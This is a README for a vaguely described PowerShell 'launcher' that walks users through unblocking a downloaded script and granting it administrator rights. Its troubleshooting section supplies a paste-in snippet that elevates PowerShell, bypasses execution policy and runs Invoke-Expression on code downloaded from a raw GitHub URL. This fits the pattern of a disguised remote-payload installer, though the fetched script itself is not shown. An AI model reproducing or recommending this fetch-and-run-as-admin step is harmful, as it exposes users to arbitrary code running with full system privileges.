# WingitLauncher

A PowerShell-based launcher utility designed to streamline application deployment and execution.

## Overview

WingitLauncher is a PowerShell script that provides an automated solution for launching and managing applications. The launcher handles the necessary setup and execution processes to ensure smooth operation across different Windows environments.

## Installation & Setup

### Step 1: Download the Launcher

1. Navigate to the repository and locate the `wingitlauncher.ps1` file
2. Click on the file to view its contents
3. Click the **Download** button or **Raw** button to download the PowerShell script
4. Save the file to your desired location on your local machine

### Step 2: Unblock the Downloaded File

Due to Windows security policies, downloaded PowerShell scripts are typically blocked by default. To enable execution:

1. **Right-click** on the downloaded `wingitlauncher.ps1` file
2. Select **Properties** from the context menu
3. In the Properties dialog box, locate the **Security** section at the bottom
4. Check the box next to **Unblock** if it appears
5. Click **OK** to apply the changes

### Step 3: Execute the Launcher

1. **Right-click** on the `wingitlauncher.ps1` file
2. Select **Run with PowerShell** from the context menu
3. A **User Account Control (UAC)** prompt will appear requesting administrator permissions
4. Click **Yes** to grant the necessary permissions
5. The launcher will now execute with the required privileges

## System Requirements

- Windows 10 or later
- PowerShell 5.1 or later
- Administrator privileges (required for UAC elevation)

## Security Considerations

This launcher requires administrator privileges to function properly. The UAC prompt is a security feature that ensures you are aware of the elevated permissions being requested. Only proceed if you trust the source and understand the implications of running scripts with administrator access.

## Troubleshooting

If you encounter any issues with the launcher or need to bypass execution policy restrictions, run the following script in PowerShell:

```powershell
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # Define the command to run elevated
    $Cmd = 'Set-ExecutionPolicy Bypass -Scope Process -Force; Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/dylan0760/Windows-Winget/refs/heads/main/GuI%20Github.ps1").Content'
    # Relaunch PowerShell elevated, telling it to execute the command
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command & { $Cmd }"
    Write-Host "Attempting to relaunch with Administrator privileges..." -ForegroundColor Yellow
} else {
    # Already running as Administrator, execute directly
    Write-Host "Running with Administrator privileges." -ForegroundColor Green
    Set-ExecutionPolicy Bypass -Scope Process -Force; Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/dylan0760/Windows-Winget/refs/heads/main/GuI%20Github.ps1").Content
}